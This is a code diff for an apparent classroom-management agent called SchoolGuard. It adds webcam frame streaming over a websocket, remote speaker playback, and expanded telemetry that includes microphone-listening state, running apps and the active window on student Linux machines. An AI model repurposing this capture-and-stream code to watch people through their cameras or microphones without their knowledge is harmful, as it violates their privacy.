+                except Exception:
+                    pass
+            return True, name, d
+        return False, "Khong co Camera", None
+
+    def _linux_webcam_worker(self):
+        while getattr(self, "_webcam_streaming", False):
+            has_cam, _, dev_path = self._get_linux_webcam_info()
+            if not has_cam or not dev_path:
+                time.sleep(1.0)
+                continue
+            proc = None
+            try:
+                if shutil.which("ffmpeg"):
+                    cmd = [
+                        "ffmpeg",
+                        "-hide_banner",
+                        "-loglevel",
+                        "error",
+                        "-f",
+                        "v4l2",
+                        "-framerate",
+                        "6",
+                        "-video_size",
+                        "640x360",
+                        "-i",
+                        dev_path,
+                        "-f",
+                        "image2pipe",
+                        "-vcodec",
+                        "mjpeg",
+                        "-q:v",
+                        "6",
+                        "-",
+                    ]
+                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+                    buf = bytearray()
+                    while getattr(self, "_webcam_streaming", False) and proc.poll() is None:
+                        chunk = proc.stdout.read(4096)
+                        if not chunk:
+                            break
+                        buf.extend(chunk)
+                        while True:
+                            soi = buf.find(b"\xff\xd8")
+                            if soi < 0:
+                                buf.clear()
+                                break
+                            eoi = buf.find(b"\xff\xd9", soi + 2)
+                            if eoi < 0:
+                                if soi > 0:
+                                    del buf[:soi]
+                                break
+                            jpg = bytes(buf[soi : eoi + 2])
+                            del buf[: eoi + 2]
+                            if self.ws and self.ws.connected and len(jpg) > 200:
+                                self.ws.send_json({
+                                    "type": "WEBCAM_FRAME",
+                                    "machine_id": self.machine_id,
+                                    "image": base64.b64encode(jpg).decode("ascii"),
+                                })
+                elif shutil.which("fswebcam"):
+                    tmp_cam = "/dev/shm/sg_webcam.jpg"
+                    while getattr(self, "_webcam_streaming", False):
+                        subprocess.run(
+                            ["fswebcam", "-q", "-d", dev_path, "-r", "640x360", "--no-banner", tmp_cam],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            timeout=3,
+                        )
+                        if os.path.exists(tmp_cam) and self.ws and self.ws.connected:
+                            with open(tmp_cam, "rb") as f:
+                                raw = f.read()
+                            if len(raw) > 200:
+                                self.ws.send_json({
+                                    "type": "WEBCAM_FRAME",
+                                    "machine_id": self.machine_id,
+                                    "image": base64.b64encode(raw).decode("ascii"),
+                                })
+                        time.sleep(0.2)
+                else:
+                    time.sleep(1.0)
+            except Exception:
+                time.sleep(0.8)
+            finally:
+                if proc:
+                    try:
+                        proc.kill()
+                    except Exception:
+                        pass
+
+    def _play_linux_pcm(self, b64):
+        try:
+            raw = base64.b64decode(b64)
+            if not raw:
+                return
+            p = getattr(self, "_spk_proc", None)
+            if not p or p.poll() is not None:
+                env = self.get_x11_env()
+                cmd = ["aplay", "-q", "-f", "S16_LE", "-r", "16000", "-c", "1", "-t", "raw"]
+                if shutil.which("paplay"):
+                    cmd = ["paplay", "--raw", "--format=s16le", "--rate=16000", "--channels=1", "--latency-msec=80"]
+                self._spk_proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
+                p = self._spk_proc
+            p.stdin.write(raw)
+            p.stdin.flush()
+        except Exception:
+            self._spk_proc = None
+
+    def _build_telemetry_payload(self, msg_type="STATUS"):
+        env = self.get_x11_env()
+        sys_m = self._collect_system_metrics()
+        has_snd = os.path.exists("/proc/asound/cards") and os.path.getsize("/proc/asound/cards") > 4
+        has_cam, cam_name, _ = self._get_linux_webcam_info()
+        payload = {
+            "type": msg_type,
+            "agent_version": "3.7",
+            "machine_id": self.machine_id,
+            "hostname": self.hostname,
+            "ip": self._get_local_ip(),
+            "mac": self.mac_addr,
+            "os": f"Xubuntu ({platform.release()})",
+            "desktop_user": env.get("SG_DESKTOP_USER", "student"),
+            "mode": self.mode,
+            "input_locked": bool(self.lock_kb or self.lock_mouse),
+            "lock_kb": self.lock_kb,
+            "lock_mouse": self.lock_mouse,
+            "veyon_status": self.veyon_status,
+            "veyon_restarts": self.veyon_restarts,
+            "blocked_apps": self.blocked_apps,
+            "running_apps": self.running_apps,
+            "active_window": self.active_window,
+            "audio_info": {
+                "has_mic": has_snd,
+                "mic_name": "ALSA / PulseAudio Input" if has_snd else "Khong co Mic",
+                "has_speaker": has_snd,
+                "speaker_name": "ALSA / PulseAudio Output" if has_snd else "Khong co Loa",
+                "volume": getattr(self, "_audio_vol", 85),
+                "muted": getattr(self, "_audio_muted", False),
+                "mic_listening": bool(getattr(self, "_mic_listening", False)),
+                "mic_level": getattr(self, "_mic_level", 0),
+                "listen_mode": getattr(self, "_listen_mode", "both"),
+            },
+            "webcam_info": {
+                "has_webcam": has_cam,
+                "webcam_name": cam_name,
+                "webcam_streaming": bool(getattr(self, "_webcam_streaming", False)),
+            },
+        }
+        payload.update(sys_m)
+        return payload
+
     def _send_status(self):
         if not self.ws or not self.ws.connected:
             return
-        env = self.get_x11_env()
         try:
-            self.ws.send_json(
-                {
-                    "type": "STATUS",
-                    "agent_version": "2.6",
-                    "machine_id": self.machine_id,
-                    "hostname": self.hostname,
-                    "ip": self._get_local_ip(),
-                    "mac": self.mac_addr,
-                    "os": f"Xubuntu ({platform.release()})",
-                    "desktop_user": env.get("SG_DESKTOP_USER", "student"),
-                    "mode": self.mode,
-                    "veyon_status": self.veyon_status,
-                    "veyon_restarts": self.veyon_restarts,
-                    "blocked_apps": self.blocked_apps,
-                    "running_apps": self.running_apps,
-                    "active_window": self.active_window,
-                }
-            )
+            self.ws.send_json(self._build_telemetry_payload("STATUS"))
         except Exception:
             pass
 
@@ -1394,6 +1935,8 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                 self.ensure_overlay_process()
                 if self.mode == "lock" and not self.disabled_xinput_ids:
                     self.set_input_locked(True)
+                elif self.mode == "normal" and (self.lock_kb or self.lock_mouse) and not self.disabled_xinput_ids:
+                    self.set_input_locked(True, self.lock_kb, self.lock_mouse)
             except Exception:
                 pass
 
@@ -1446,25 +1989,7 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
 
                 # Đăng ký thông tin máy ngay khi kết nối
                 self._update_running_apps_telemetry()
-                env = self.get_x11_env()
-                ws.send_json(
-                    {
-                        "type": "REGISTER",
-                        "agent_version": "2.6",
-                        "machine_id": self.machine_id,
-                        "hostname": self.hostname,
-                        "ip": self._get_local_ip(),
-                        "mac": self.mac_addr,
-                        "os": f"Xubuntu ({platform.release()})",
-                        "desktop_user": env.get("SG_DESKTOP_USER", "student"),
-                        "mode": self.mode,
-                        "veyon_status": self.veyon_status,
-                        "veyon_restarts": self.veyon_restarts,
-                        "blocked_apps": self.blocked_apps,
-                        "running_apps": self.running_apps,
-                        "active_window": self.active_window,
-                    }
-                )
+                ws.send_json(self._build_telemetry_payload("REGISTER"))
 
                 while ws.connected:
                     raw_msg = ws.recv()
